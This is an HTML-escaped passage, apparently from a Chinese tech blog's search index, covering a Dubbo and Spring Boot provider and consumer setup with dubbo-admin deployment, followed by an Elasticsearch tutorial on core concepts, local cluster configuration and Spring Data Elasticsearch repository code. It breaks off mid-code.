&lt;!--用于测试，可删去--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt;\t\t\t&lt;version&gt;2.4.0&lt;/version&gt;\t\t\t&lt;scope&gt;test&lt;/scope&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;junit&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;junit&lt;/artifactId&gt;\t\t\t&lt;scope&gt;test&lt;/scope&gt;\t\t&lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;            &lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt;            &lt;version&gt;5.7.0&lt;/version&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;junit&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;junit&lt;/artifactId&gt;\t\t\t&lt;version&gt;4.12&lt;/version&gt;\t\t&lt;/dependency&gt;\t&lt;/dependencies&gt;\t&lt;build&gt;\t\t&lt;plugins&gt;\t\t\t&lt;plugin&gt;\t\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t\t&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\t\t\t&lt;/plugin&gt;\t\t&lt;/plugins&gt;\t&lt;/build&gt;&lt;/project&gt;\n\n\n注意：本文使用的dubbo-spring-boot-starter依赖最高只支持Dubbo2.6版本的，如果要使用Dubbo2.7版本的Springboot启动器则依赖如下：\n\n&lt;dependency&gt;    &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;    &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;2.7.x&lt;/version&gt;&lt;/dependency&gt;\n\n\n这个依赖中的配置项以及注解和之前2.6版本相比，改动非常大。可见Dubbo的Springboot依赖的版本兼容做的并不好，本文使用是为了简单易懂。如果想要平滑升级，并且使用新版本的Dubbo，可以参考官方网站的依赖配置。\n\n\n配置文件application.properties\n\n# spring应用名spring.application.name=dubbo-demo-provider# dubbo应用idspring.dubbo.application.id=dubbo-demo-provider# dubbo应用名称spring.dubbo.application.name=dubbo-demo-provider# 应用负责人#spring.dubbo.application.owner=xxx# 组织名#spring.dubbo.application.organization=xxx# zookeeper注册中心地址（多个节点用分号隔开）spring.dubbo.registry.address=zookeeper://192.168.74.88:2181;zookeeper://192.168.74.88:2182# 是否是服务提供者spring.dubbo.server=true# 协议名称，采用dubbo协议spring.dubbo.protocol.name=dubbo# 协议序列化方式#spring.dubbo.protocol.serialization=hessian2 # 协议端口spring.dubbo.protocol.port=20880# 远程服务超时时间#spring.dubbo.provider.timeout=1000# 远程服务调用重试次数#spring.dubbo.provider.retries=0# 负载均衡策略#spring.dubbo.provider.loadbalance=roundrobin\n\n其中被注解的配置都是可选择部分，其余都是必须的配置。更多配置可查看配置清单。\n\n启动类\n\n// Dubbo注解@EnableDubboConfiguration@SpringBootApplicationpublic class ProviderApplication &#123;\tpublic static void main(String[] args) &#123;\t\tSpringApplication.run(ProviderApplication.class, args);\t&#125;&#125;\n\n\n服务实现\n\n@Component@Service(interfaceClass = HelloSerrvice.class)public class HelloServiceImpl implements HelloSerrvice &#123;    @Override    public String sayHello(String name) &#123;        return &quot;liduoan&quot; + name;    &#125;&#125;\n\n该实现类上，除了以前Spring的注解，还添加了Dubbo的**@Service**注解(与spring中的@Service注解区别)，标识该类是一个服务提供者。其中常用的属性如下：\n\ninterfaceClass : 标识该服务实现的接口\nweight : 该服务的权重\ncluster : 集群容错策略(failover, failfast, failsafe, failback, forking)\nretries : 重试次数\nloadbalance ：负载均衡策略(random, roundrobin, leastactive)\ntimeout : 超时时长\nexecutes : 线程池最大线程数\nactives : 占用连接最大请求数\n\n在整体上需要注意的点：\nzookeeper是否允许外部连接上？\nzookeeper版本是否对的上？\ndubbo的版本和对应的配置是不一样的。\n服务消费者\n导入依赖\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\txsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\t&lt;parent&gt;\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\t\t&lt;version&gt;2.0.1.RELEASE&lt;/version&gt;\t\t&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\t&lt;/parent&gt;\t&lt;groupId&gt;com.example&lt;/groupId&gt;\t&lt;artifactId&gt;consumer&lt;/artifactId&gt;\t&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\t&lt;name&gt;consumer&lt;/name&gt;\t&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;\t&lt;properties&gt;\t\t&lt;java.version&gt;1.8&lt;/java.version&gt;\t&lt;/properties&gt;\t&lt;dependencies&gt;\t\t&lt;!--springboot的web模块--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;!--dubbo--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.alibaba.spring.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;\t\t\t&lt;version&gt;2.0.0&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;\t\t\t&lt;exclusions&gt;\t\t\t\t&lt;exclusion&gt;\t\t\t\t\t&lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt;\t\t\t\t\t&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\t\t\t\t&lt;/exclusion&gt;\t\t\t&lt;/exclusions&gt;\t\t&lt;/dependency&gt;\t\t&lt;!--zookeeper--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;zookeeper&lt;/artifactId&gt;\t\t\t&lt;version&gt;3.4.10&lt;/version&gt;\t\t\t&lt;exclusions&gt;\t\t\t\t&lt;exclusion&gt;\t\t\t\t\t&lt;groupId&gt;org.slf4j&lt;/groupId&gt;\t\t\t\t\t&lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;\t\t\t\t&lt;/exclusion&gt;\t\t\t\t&lt;exclusion&gt;\t\t\t\t\t&lt;groupId&gt;log4j&lt;/groupId&gt;\t\t\t\t\t&lt;artifactId&gt;log4j&lt;/artifactId&gt;\t\t\t\t&lt;/exclusion&gt;\t\t\t&lt;/exclusions&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.101tec&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;zkclient&lt;/artifactId&gt;\t\t\t&lt;version&gt;0.9&lt;/version&gt;\t\t\t&lt;exclusions&gt;\t\t\t\t&lt;exclusion&gt;\t\t\t\t\t&lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;\t\t\t\t\t&lt;groupId&gt;org.slf4j&lt;/groupId&gt;\t\t\t\t&lt;/exclusion&gt;\t\t\t&lt;/exclusions&gt;\t\t&lt;/dependency&gt;\t\t&lt;!--api接口工程--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;dubbo_liduoan_demo&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;APIInteface&lt;/artifactId&gt;\t\t\t&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\t\t&lt;/dependency&gt;\t&lt;/dependencies&gt;\t&lt;build&gt;\t\t&lt;plugins&gt;\t\t\t&lt;plugin&gt;\t\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t\t&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\t\t\t&lt;/plugin&gt;\t\t&lt;/plugins&gt;\t&lt;/build&gt;&lt;/project&gt;\n\n\n配置文件application.properties\n\n# spring应用名spring.application.name=dubbo-demo-consumer# 端口号server.port=20881# dubbo应用idspring.dubbo.application.id=dubbo-demo-consumer# dubbo应用名称spring.dubbo.application.name=dubbo-demo-consumer# 应用负责人#spring.dubbo.application.owner=xxx# 组织名#spring.dubbo.application.organization=xxx# zookeeper注册中心地址（多个节点用分号隔开）spring.dubbo.registry.address=zookeeper://192.168.74.88:2181;zookeeper://192.168.74.88:2182# 远程服务调用超时#spring.dubbo.consumer.timeout=1000# 远程服务调用重试次数#spring.dubbo.consumer.retries=0# 集群容错策略#spring.dubbo.consumer.cluster=failover# 负载均衡策略#spring.dubbo.consumer.loadbalance=random\n\n\n启动类\n\n@EnableDubboConfiguration@SpringBootApplicationpublic class ConsumerApplication &#123;\tpublic static void main(String[] args) &#123;\t\tSpringApplication.run(ConsumerApplication.class, args);\t&#125;&#125;\n\n\nController调用服务\n\n@RestController@RequestMapping(&quot;/user&quot;)public class Controller &#123;    @Reference    private HelloSerrvice helloSerrvice;    @GetMapping(&quot;/sayhello&quot;)    public String sayHello(String name)&#123;        return helloSerrvice.sayHello(name);    &#125;&#125;\n\n在该Controller中，我们需要调用之前的服务提供者的HelloService接口，可是该接口的实现类在服务提供者微服务中，不在同一个模块中，就不能使用Spring的@Autowired注解注入。Dubbo为我们提供了一个**@Reference**注解，相当于”远程注入”。其中常用的属性如下：\n\ncluster : 集群容错策略(failover, failfast, failsafe, failback, forking)\nretries : 重试次数\nloadbalance ：负载均衡策略(random, roundrobin, leastactive)\ntimeout : 超时时长\nactives : 占用连接最大请求数(优先级高于@Service注解中的配置)\n\n小结这样，我们就完成了了入门程序的编写。与之前的Spring Cloud相比有何不同？\n之前我们Spring Cloud的服务接口都是定义在Controller层，通过Feign进行远程调用，这是因为Feign是基于Http进行调用，只要知道服务方的url即可。而在Dubbo中，我们的服务接口定义在了Service层，需要使用的时候只要在消费者方用@Reference注入即可，这样就可以像调用本地服务那样调用远程服务。\n但是Dubbo有一个无法克服的缺点，就是服务提供方和消费方在带在代码上会产生依赖性，这是因为服务接口需要同时被服务提供方所依赖(在pom文件中可用看到)。\nDubbo管理平台Dubbo提供了功能非常强大的管理平台，有两个版本，我们分别介绍。\n老版本\n下载地址\n\nwar包下载地址：https://github.com/apache/dubbo/tree/2.5.x （分支为2.5.x）\njar包下载地址：https://github.com/apache/dubbo-admin/tree/master （分支为master)\n\n无论是jar版还是war版，dubbo-admin就是Dubbo管理平台所在的目录，如果没有看到，说明选择的分支不对。\n\n\n修改配置文件\n\njar版本的配置文件是dubbo-admin&#x2F;src&#x2F;main&#x2F;resources&#x2F;application.properties，war版本的配置文件dubbo-admin&#x2F;src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;dubbo.properties。修改其中的注册中心(Zookeeper)地址即可。\n\n打包\n\n在dubbo-admin目录执行以下命令：\nmvn clean package -Dmaven.test.skip=true\n\n打包后可将名称修改为dubbo-admin.jar(dubbo-admin.war)\n\n运行\n\njar版本的通过如下命令运行:\njava -jar dubbo-admin.jar\n\nwar版本的需要用tomcat运行。将war包放在tomcat的webapps目录下后，在bin目录下通过如下命令运行：\n./startup.sh\n\n\n访问(以本机为例)\n\njar版本的访问地址: localhost:7001 (端口号可在配置文件修改)\nwar版本的访问地址：localhost:8080&#x2F;dubbo-admin\n访问后输入账号root和密码root(可在配置文件中修改)即可登录\n新版本相比于老版本，新版本采用了前后端分离的开发方式，前端使用Vue.js进行开发，后端使用Springboot。因此要确保安装了node环境。\n\n下载地址：https://github.com/apache/dubbo-admin/tree/develop (develop分支)\n修改配置文件\n\n进入dubbo-server(后台)目录，修改src&#x2F;main&#x2F;resources目录中的application.properties配置文件，将注册中心的地址改为自己的即可。\n\n打包\n\n进入dubbo-server(后台)目录，执行以下命令打包:\nmvn clean package -Dmaven.test.skip=true\n\n\n运行\n\n后台jar包通过如下命令运行:\njava -jar dubbo-admin-server.jar\n\n进入dubbo-admin-ui(前端)目录，通过如下命令运行:\nnpm installnpm run dev\n\n","tags":["2021"]},{"title":"ElasticSearch","url":"/2021/03/11/2021/ElasticSearch/","content":"\n\nElasticSearchElasticsearch核心概念1.1 索引 index一个索引就是一个拥有几分相似特征的文档的集合。比如说，你可以有一个客户数据的索引，另一个产品目录的索引，还有一个订单数据的索引。一个索引由一个名字来标识（必须全部是小写字母的），并且当我们要对对应于这个索引中的文档进行索引、搜索、更新和删除的时候，都要使用到这个名字。在一个集群中，可以定义任意多的索引。\n1.2 类型 type在一个索引中，你可以定义一种或多种类型。一个类型是你的索引的一个逻辑上的分类&#x2F;分区，其语义完全由你来定。通常，会为具有一组共同字段的文档定义一个类型。比如说，我们假设你运营一个博客平台并且将你所有的数据存储到一个索引中。在这个索引中，你可以为用户数据定义一个类型，为博客数据定义另一个类型，当然，也可以为评论数据定义另一个类型。\n1.3 字段Field相当于是数据表的字段，对文档数据根据不同属性进行的分类标识\n1.4 映射 mappingmapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其它就是处理es里面数据的一些使用规则设置也叫做映射，按着最优规则处理数据对性能提高很大，因此才需要建立映射，并且需要思考如何建立映射才能对性能更好。\n1.5 文档 document一个文档是一个可被索引的基础信息单元。比如，你可以拥有某一个客户的文档，某一个产品的一个文档，当然，也可以拥有某个订单的一个文档。文档以JSON（Javascript Object Notation）格式来表示，而JSON是一个到处存在的互联网数据交互格式。\n在一个index&#x2F;type里面，你可以存储任意多的文档。注意，尽管一个文档，物理上存在于一个索引之中，文档必须被索引&#x2F;赋予一个索引的type。\n1.6 接近实时 NRTElasticsearch是一个接近实时的搜索平台。这意味着，从索引一个文档直到这个文档能够被搜索到有一个轻微的延迟（通常是1秒以内）\n1.7 集群 cluster一个集群就是由一个或多个节点组织在一起，它们共同持有整个的数据，并一起提供索引和搜索功能。一个集群由一个唯一的名字标识，这个名字默认就是“elasticsearch”。这个名字是重要的，因为一个节点只能通过指定某个集群的名字，来加入这个集群\n1.8 节点 node一个节点是集群中的一个服务器，作为集群的一部分，它存储数据，参与集群的索引和搜索功能。和集群类似，一个节点也是由一个名字来标识的，默认情况下，这个名字是一个随机的漫威漫画角色的名字，这个名字会在启动的时候赋予节点。这个名字对于管理工作来说挺重要的，因为在这个管理过程中，你会去确定网络中的哪些服务器对应于Elasticsearch集群中的哪些节点。\n一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做“elasticsearch”的集群中，这意味着，如果你在你的网络中启动了若干个节点，并假定它们能够相互发现彼此，它们将会自动地形成并加入到一个叫做“elasticsearch”的集群中。\n在一个集群里，只要你想，可以拥有任意多个节点。而且，如果当前你的网络中没有运行任何Elasticsearch节点，这时启动一个节点，会默认创建并加入一个叫做“elasticsearch”的集群。\n1.9 分片和复制 shards&amp;replicas一个索引可以存储超出单个结点硬件限制的大量数据。比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间；或者单个节点处理搜索请求，响应太慢。为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。当你创建一个索引的时候，你可以指定你想要的分片的数量。每个分片本身也是一个功能完善并且独立的“索引”，这个“索引”可以被放置到集群中的任何节点上。分片很重要，主要有两方面的原因：1）允许你水平分割&#x2F;扩展你的内容容量。2）允许你在分片（潜在地，位于多个节点上）之上进行分布式的、并行的操作，进而提高性能&#x2F;吞吐量。\n至于一个分片怎样分布，它的文档怎样聚合回搜索请求，是完全由Elasticsearch管理的，对于作为用户的你来说，这些都是透明的。\n在一个网络&#x2F;云的环境里，失败随时都可能发生，在某个分片&#x2F;节点不知怎么的就处于离线状态，或者由于任何原因消失了，这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做复制分片，或者直接叫复制。\n复制之所以重要，有两个主要原因： 在分片&#x2F;节点失败的情况下，提供了高可用性。因为这个原因，注意到复制分片从不与原&#x2F;主要（original&#x2F;primary）分片置于同一节点上是非常重要的。扩展你的搜索量&#x2F;吞吐量，因为搜索可以在所有的复制上并行运行。总之，每个索引可以被分成多个分片。一个索引也可以被复制0次（意思是没有复制）或多次。一旦复制了，每个索引就有了主分片（作为复制源的原来的分片）和复制分片（主分片的拷贝）之别。分片和复制的数量可以在索引创建的时候指定。在索引创建之后，你可以在任何时候动态地改变复制的数量，但是你事后不能改变分片的数量。\n默认情况下，Elasticsearch中的每个索引被分片5个主分片和1个复制，这意味着，如果你的集群中至少有两个节点，你的索引将会有5个主分片和另外5个复制分片（1个完全拷贝），这样的话每个索引总共就有10个分片。\nElasticSearch集群​\tES集群是一个 P2P类型(使用 gossip 协议)的分布式系统，除了集群状态管理以外，其他所有的请求都可以发送到集群内任意一台节点上，这个节点可以自己找到需要转发给哪些节点，并且直接跟这些节点通信。所以，从网络架构及服务配置上来说，构建集群所需要的配置极其简单。在 Elasticsearch 2.0 之前，无阻碍的网络下，所有配置了相同 cluster.name 的节点都自动归属到一个集群中。2.0 版本之后，基于安全的考虑避免开发环境过于随便造成的麻烦，从 2.0 版本开始，默认的自动发现方式改为了单播(unicast)方式。配置里提供几台节点的地址，ES 将其视作 gossip router 角色，借以完成集群的发现。由于这只是 ES 内一个很小的功能，所以 gossip router 角色并不需要单独配置，每个 ES 节点都可以担任。所以，采用单播方式的集群，各节点都配置相同的几个节点列表作为 router 即可。\n​\t集群中节点数量没有限制，一般大于等于2个节点就可以看做是集群了。一般处于高性能及高可用方面来考虑一般集群中的节点数量都是3个及3个以上。\n6.1 集群的相关概念6.1.1 集群 cluster一个集群就是由一个或多个节点组织在一起，它们共同持有整个的数据，并一起提供索引和搜索功能。一个集群由一个唯一的名字标识，这个名字默认就是“elasticsearch”。这个名字是重要的，因为一个节点只能通过指定某个集群的名字，来加入这个集群\n6.1.2 节点 node一个节点是集群中的一个服务器，作为集群的一部分，它存储数据，参与集群的索引和搜索功能。和集群类似，一个节点也是由一个名字来标识的，默认情况下，这个名字是一个随机的漫威漫画角色的名字，这个名字会在启动的时候赋予节点。这个名字对于管理工作来说挺重要的，因为在这个管理过程中，你会去确定网络中的哪些服务器对应于Elasticsearch集群中的哪些节点。\n一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做“elasticsearch”的集群中，这意味着，如果你在你的网络中启动了若干个节点，并假定它们能够相互发现彼此，它们将会自动地形成并加入到一个叫做“elasticsearch”的集群中。\n在一个集群里，只要你想，可以拥有任意多个节点。而且，如果当前你的网络中没有运行任何Elasticsearch节点，这时启动一个节点，会默认创建并加入一个叫做“elasticsearch”的集群。\n6.1.3 分片和复制 shards&amp;replicas一个索引可以存储超出单个结点硬件限制的大量数据。比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间；或者单个节点处理搜索请求，响应太慢。为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。当你创建一个索引的时候，你可以指定你想要的分片的数量。每个分片本身也是一个功能完善并且独立的“索引”，这个“索引”可以被放置到集群中的任何节点上。分片很重要，主要有两方面的原因：1）允许你水平分割&#x2F;扩展你的内容容量。2）允许你在分片（潜在地，位于多个节点上）之上进行分布式的、并行的操作，进而提高性能&#x2F;吞吐量。\n至于一个分片怎样分布，它的文档怎样聚合回搜索请求，是完全由Elasticsearch管理的，对于作为用户的你来说，这些都是透明的。\n在一个网络&#x2F;云的环境里，失败随时都可能发生，在某个分片&#x2F;节点不知怎么的就处于离线状态，或者由于任何原因消失了，这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做复制分片，或者直接叫复制。\n复制之所以重要，有两个主要原因： 在分片&#x2F;节点失败的情况下，提供了高可用性。因为这个原因，注意到复制分片从不与原&#x2F;主要（original&#x2F;primary）分片置于同一节点上是非常重要的。扩展你的搜索量&#x2F;吞吐量，因为搜索可以在所有的复制上并行运行。总之，每个索引可以被分成多个分片。一个索引也可以被复制0次（意思是没有复制）或多次。一旦复制了，每个索引就有了主分片（作为复制源的原来的分片）和复制分片（主分片的拷贝）之别。分片和复制的数量可以在索引创建的时候指定。在索引创建之后，你可以在任何时候动态地改变复制的数量，但是你事后不能改变分片的数量。\n默认情况下，Elasticsearch中的每个索引被分片5个主分片和1个复制，这意味着，如果你的集群中至少有两个节点，你的索引将会有5个主分片和另外5个复制分片（1个完全拷贝），这样的话每个索引总共就有10个分片。\n6.2 集群的搭建6.2.1 准备三台elasticsearch服务器创建elasticsearch-cluster文件夹，在内部复制三个elasticsearch服务\n6.2.2 修改每台服务器配置修改elasticsearch-cluster\\node*\\config\\elasticsearch.yml配置文件\nnode1节点：#节点1的配置信息：#集群名称，保证唯一cluster.name: my-elasticsearch#节点名称，必须不一样node.name: node-1#必须为本机的ip地址network.host: 127.0.0.1#服务端口号，在同一机器下必须不一样http.port: 9200#集群间通信端口号，在同一机器下必须不一样transport.tcp.port: 9300#设置集群自动发现机器ip集合discovery.zen.ping.unicast.hosts: [&quot;127.0.0.1:9300&quot;,&quot;127.0.0.1:9301&quot;,&quot;127.0.0.1:9302&quot;]\n\nnode2节点：#节点2的配置信息：#集群名称，保证唯一cluster.name: my-elasticsearch#节点名称，必须不一样node.name: node-2#必须为本机的ip地址network.host: 127.0.0.1#服务端口号，在同一机器下必须不一样http.port: 9201#集群间通信端口号，在同一机器下必须不一样transport.tcp.port: 9301#设置集群自动发现机器ip集合discovery.zen.ping.unicast.hosts: [&quot;127.0.0.1:9300&quot;,&quot;127.0.0.1:9301&quot;,&quot;127.0.0.1:9302&quot;]\n\nnode3节点：#节点3的配置信息：#集群名称，保证唯一cluster.name: my-elasticsearch#节点名称，必须不一样node.name: node-3#必须为本机的ip地址network.host: 127.0.0.1#服务端口号，在同一机器下必须不一样http.port: 9202#集群间通信端口号，在同一机器下必须不一样transport.tcp.port: 9302#设置集群自动发现机器ip集合discovery.zen.ping.unicast.hosts: [&quot;127.0.0.1:9300&quot;,&quot;127.0.0.1:9301&quot;,&quot;127.0.0.1:9302&quot;]\n\n6.2.3 启动各个节点服务器双击elasticsearch-cluster\\node*\\bin\\elasticsearch.bat\n启动三个节点\n6.2.4 集群测试添加索引和映射PUT\t\tlocalhost:9200/blog1\n\n&#123;    &quot;mappings&quot;: &#123;        &quot;article&quot;: &#123;            &quot;properties&quot;: &#123;                &quot;id&quot;: &#123;                \t&quot;type&quot;: &quot;long&quot;,                    &quot;store&quot;: true,                    &quot;index&quot;:&quot;not_analyzed&quot;                &#125;,                &quot;title&quot;: &#123;                \t&quot;type&quot;: &quot;text&quot;,                    &quot;store&quot;: true,                    &quot;index&quot;:&quot;analyzed&quot;,                    &quot;analyzer&quot;:&quot;standard&quot;                &#125;,                &quot;content&quot;: &#123;                \t&quot;type&quot;: &quot;text&quot;,                    &quot;store&quot;: true,                    &quot;index&quot;:&quot;analyzed&quot;,                    &quot;analyzer&quot;:&quot;standard&quot;                &#125;            &#125;        &#125;    &#125;&#125;\n\n添加文档POST\tlocalhost:9200/blog1/article/1\n\n&#123;\t&quot;id&quot;:1,\t&quot;title&quot;:&quot;ElasticSearch是一个基于Lucene的搜索服务器&quot;,\t&quot;content&quot;:&quot;它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。&quot;&#125;\n\n\n总结关于集群的问题\n首先注意点在于每一个es都可能会崩溃\n那么如果崩溃了数据怎么办？&#x3D;&#x3D;&#x3D;&#x3D;&gt;复制\n其次索引的大小可能会超过节点的大小\n那么需要做什么？&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;分片\n上面就很清晰明了的说明了复制和分片在集群的用处\n\n这就是三个集群常见的物理结构分布\n同时注意到一个问题，他们是怎么知道自己是一个集群的？\n通过集群名字自己找到的。\nSpring Data ElasticSearch简介什么是Spring DataSpring Data是一个用于简化数据库访问，并支持云服务的开源框架。其主要目标是使得对数据的访问变得方便快捷，并支持map-reduce框架和云计算数据服务。 Spring Data可以极大的简化JPA的写法，可以在几乎不用写实现的情况下，实现对数据的访问和操作。除了CRUD外，还包括如分页、排序等一些常用的功能。\nSpring Data的官网：http://projects.spring.io/spring-data/\n什么是Spring Data ElasticSearchSpring Data ElasticSearch 基于 spring data API 简化 elasticSearch操作，将原始操作elasticSearch的客户端API 进行封装 。Spring Data为Elasticsearch项目提供集成搜索引擎。Spring Data Elasticsearch POJO的关键功能区域为中心的模型与Elastichsearch交互文档和轻松地编写一个存储库数据访问层。\n官方网站：http://projects.spring.io/spring-data-elasticsearch/ \nSpring Data ElasticSearch入门1）导入Spring Data ElasticSearch坐标\n&lt;!-- es 6.4.3版本 --&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt;&lt;!--netty--&gt;\t\t\t&lt;version&gt;2.1.1.RELEASE&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.modelmapper&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;modelmapper&lt;/artifactId&gt;\t\t\t&lt;version&gt;1.1.0&lt;/version&gt;\t\t&lt;/dependency&gt;\n\n主要就是第一个\n第二个是为了把某个类换成另外的一个类\n2）yml文件中设置号ES地址\n# DataSource Configspring:  datasource:    driver-class-name: com.mysql.jdbc.Driver    url: jdbc:mysql://127.0.0.1:3306/eblog?useUnicode=true&amp;useSSL=false&amp;characterEncoding=utf8&amp;serverTimezone=UTC    username: root    password: root  data:    elasticsearch:      cluster-name: elasticsearch      cluster-nodes: 10.161.133.199:9300      repositories:        enabled: true\n\n3)建立索引\n@Data@Document(indexName=&quot;post&quot;, type=&quot;post&quot;, createIndex=true)public class PostDocment implements Serializable &#123;    @Id    private Long id;    //一条记录的Id    // ik分词器    @Field(type = FieldType.Text, searchAnalyzer=&quot;ik_smart&quot;, analyzer = &quot;ik_max_word&quot;)    private String title;    //文章的title    @Field(type = FieldType.Long)    private Long authorId;    //作者的ID    @Field(type = FieldType.Keyword)    private String authorName;    private String authorAvatar;    //作者的名字 头像    private Long categoryId;    //分类ID    @Field(type = FieldType.Keyword)    private String categoryName;    //分类的名称    //置顶    private Integer level;    //精华    private Boolean recomment;    //评论数量    private Integer commentCount;    //阅读量    private Integer viewCount;    @Field(type = FieldType.Date)    private Date created;    //时间&#125;\n\n其中，注解解释如下：@Document(indexName=&quot;blob3&quot;,type=&quot;article&quot;)：    indexName：索引的名称（必填项）    type：索引的类型@Id：主键的唯一标识@Field(index=true,analyzer=&quot;ik_smart&quot;,store=true,searchAnalyzer=&quot;ik_smart&quot;,type = FieldType.text)    index：是否设置分词    analyzer：存储时使用的分词器    searchAnalyze：搜索时使用的分词器    store：是否存储    type: 数据类型\n\n当我们配置好索引实体类，springboot会帮助我们在ES中建立好index\n4）继承ElasticsearchRepository\npackage com.elasticsearch.es.search.responstity;        import com.elasticsearch.es.search.model.PostDocment;        import org.springframework.data.elasticsearch.repository.ElasticsearchRepository;        import org.springframework.stereotype.Repository;/** * @description: * @author: Liduoan * @time: 2021/3/12 */@Repositorypublic interface PostRepository extends ElasticsearchRepository&lt;PostDocment, Long&gt; &#123;&#125;\n\n我们主要通过继承然后进行ES的增删改查\n5)数据导入索引\n/** * @description: * @author: Liduoan * @time: 2021/3/12 */@RestControllerpublic class indexController &#123;    @Autowired    private PostService postService;    @Autowired    ModelMapper modelMapper;    @Autowired    PostRepository postRepository;    @GetMapping(&quot;/putMysql&quot;)    public Result getres()&#123;        //mysql查询记录        List&lt;MPost&gt; list = postService.selectAll();        //索引值集合        List&lt;PostDocment&gt; res = new ArrayList&lt;&gt;();        for(int i=0;i&lt;list.size();i++)&#123;            //转换类型            PostDocment map = modelMapper.map(list.get(i), PostDocment.class);            res.add(map);        &#125;        postRepository.saveAll(res);        return new Result(200,&quot;ok&quot;,list);    &#125;&#125;\n\n\n\nElasticSearch测试测试可以使用全查询和根据输入查询\n全部查询\n@GetMapping(&quot;/getEs&quot;)public Result getEs()&#123;    Iterable&lt;PostDocment&gt; all = postRepository.findAll();    Iterator&lt;PostDocment&gt; iterator = all.iterator();    List&lt;PostDocment&gt; res = new ArrayList&lt;&gt;();    while(iterator.hasNext())&#123;        res.add(iterator.next());    &#125;    return new Result(200,&quot;OK&quot;,res);&#125;\n\n根据搜索条件查询\n@GetMapping(&quot;/getEsSear&quot;)public Result getEsSear(@RequestParam(&quot;s&quot;) String s)&#123;    MultiMatchQueryBuilder multiMatchQueryBuilder = QueryBuilders.multiMatchQuery(s,            &quot;title&quot;, &quot;authorName&quot;, &quot;categoryName&quot;);    Iterable&lt;PostDocment&gt; search = postRepository.search(multiMatchQueryBuilder);    Iterator&lt;PostDocment&gt; iterator = search.iterator();    List&lt;PostDocment&gt; res = 